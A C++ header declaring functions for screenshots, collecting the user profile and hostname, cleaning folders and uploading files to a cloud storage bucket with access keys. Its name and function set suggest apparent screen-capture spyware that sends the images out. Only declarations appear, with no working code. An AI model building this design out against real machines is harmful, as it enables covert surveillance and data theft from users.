// RedHorseCore.h
#pragma once

#include <windows.h>
#include <stdint.h>
#include <string>
#include <iostream>
#include <chrono>

namespace RedHorseCore {
    std::wstring getCurrentTimestamp();
    std::wstring getUserProfile();
    std::wstring getHostname();

    bool HasAtLeast200BmpFiles(const std::wstring& folderPath);

    void ShootScreen(const std::wstring& filename, HWND hWnd);
    void init();
    void cleanFolder(const std::wstring& folderPath);
    void uploadFiles(const std::string& bucketName, const std::string& directory, const std::string& endpoint, const std::string& accessKeyId, const std::string& accessKeySecret);
    std::string wstring_to_string(const std::wstring& wstr);
}